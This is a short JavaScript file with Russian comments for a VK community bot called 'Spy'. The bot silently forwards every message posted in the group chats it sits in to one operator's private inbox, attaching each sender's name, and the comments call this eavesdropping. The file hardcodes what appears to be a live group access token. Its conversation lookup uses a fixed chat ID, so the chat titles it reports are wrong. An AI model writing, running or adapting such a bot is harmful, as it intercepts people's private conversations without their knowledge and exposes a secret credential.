let token = '7596e65f859328958e507d0034519eda18ce0b1bdc94133f300a36b73030cd917ad54d992eef75ec00791'; // Токен группы
let ugroupid = 191812881; // Id группы
const SpyUserID = 342277250; // Ваш айди

/* Перед тем, как использовать шпиона, напишите
      ему что-нибудь в ЛС, чтобы у него был
            доступ к вашей личке!             */

/*    Чтобы включить прослушку только для
     определенной беседы, раскомментируйте
    строку под номером 29 и впишите туда Id
      беседы, которую хотите прослушивать     */

// Загрузка vk-io
const { VK } = require("vk-io");
const vk = new VK();
const { updates, snippets } = vk;
vk.setOptions({ 
	token: token,
	pollingGroupId: ugroupid
});

// Начало работы
updates.startPolling();
console.log('> [Spy] Загрузка завершена!');

// Обработка сообщений
updates.on('message', async (message) => {
    // if(Number(message.chatId) !== 0) return;

    // Получаем инфу о беседе
    var chat = await vk.api.messages.getConversationsById({ peer_ids: 2000000010 });

    // Проверка на сообщение от твоей группы
    if(Number(message.senderId) == Number(-ugroupid)) return;

    // Для сообществ
    if(Number(message.senderId) <= 0) {
        var group = await vk.api.groups.getById({ group_id: -message.senderId });
        console.log(`> [Spy] ${group[0].name} [${chat.items[0].chat_settings.title} | ${message.chatId}]: ${message.text}`);
        return vk.api.messages.send({ peer_id: SpyUserID, message: `@club${-message.senderId} (${group[0].name}) [${chat.items[0].chat_settings.title} | ${message.chatId}]:\n${message.text}` });
    }

    // Для пользователей
    var user = await vk.api.users.get({ user_id: Number(message.senderId) });
    vk.api.messages.send({ peer_id: SpyUserID, message: `@id${message.senderId} (${user[0].first_name} ${user[0].last_name}) [${chat.items[0].chat_settings.title} | ${message.chatId}]:\n${message.text}` });
    console.log(`> [Spy] ${user[0].first_name} ${user[0].last_name} [${chat.items[0].chat_settings.title} | ${message.chatId}]: ${message.text}`);
});